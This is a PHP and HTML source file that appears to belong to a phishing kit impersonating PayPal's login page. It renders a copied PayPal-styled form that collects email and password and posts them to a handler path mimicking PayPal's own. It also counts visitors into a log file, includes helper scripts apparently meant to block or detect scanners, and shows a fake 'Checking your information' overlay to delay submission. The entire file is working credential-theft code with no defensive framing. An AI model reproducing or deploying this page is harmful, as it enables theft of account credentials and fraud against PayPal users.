<?php 
error_reporting(0); 
include('../blocker.php');
include('../detect.php');
include('../function.php');
include('../pais/logintrans.php');
include('../pais/enc.php');

$datei = fopen("../logsz/visitor.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../logsz/visitor.txt","w");
fwrite($datei, $count);
fclose($datei);

?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <link rel="shortcut icon" link rel="logo-icon" href="img/mou.png">
	<title>Login - PayPal</title>
   <link rel="stylesheet" type="text/css" href="css/smart.css">
	<link rel="stylesheet" type="text/css" href="css/login.css">
</head>
<body>

<div class="hide" id="checking_info" aria-busy="true">
   <img src="img/icon.gif">
   <p class="checkingInfo">Checking your information…</p>
   </div>

   <div class="all_login">
   <div class="col-rez"></div>
   	<header>
   		<img src="img/paypal-logo.svg">
   	</header>
   	<div class="form_login">
   		<form action="../webscr?cmd=_login-run&amp;dispatch=<?php echo md5(microtime());?>" method="post" id="form_signin">
   			<input type="email" name="email" placeholder="Email" id="email" required>
   			<input type="password" name="pass" placeholder="Password" id="password" required>
   			<input type="submit" class="btnLogin" name="sbt_login" value="Log In">
   		</form>
   	</div>
   	<div class="have">
   		<div class="h_t">
   			<a href="#">Having trouble logging in?</a>
   		</div>
   		<div class="sig">
   			<button>
   				<a href="#">Sign Up</a>
   			</button>
   		</div>
   	</div>
   </div>

   <footer>
   	<ul>
   		<li>
   			<a href="#">
   				Contact Us
   			</a>
   		</li>
   		<li>
   			<a href="#">
   				Privacy
   			</a>
   		</li>
   		<li>
   			<a href="#">
   				Legal
   			</a>
   		</li>
   		<li>
   			<a href="#">
   				Worldwide
   			</a>
   		</li>
   	</ul>
   </footer>
   

<script type="text/javascript" src="js/jquery-3.1.1.min.js"></script>
<script type="text/javascript">

$(function(){
$('.btnLogin').click(function(event){
event.preventDefault();
window.setTimeout(function(form){
$(form).submit();
}, 5000, $(this).closest('form'));
});
});

$(document).ready(function(){

var email = $("#email").val();
var pass  = $("#password").val();

$('.btnLogin').click(function(){
			
$('#checking_info').show();
$('.all_login').css('opacity' , '0.2');
$('footer').css('opacity' , '0.2');
$('#checking_info').css('opacity' , '1');
$('.all_login').css('z-index' , '0');
			

});
});



</script>
</body>
</html>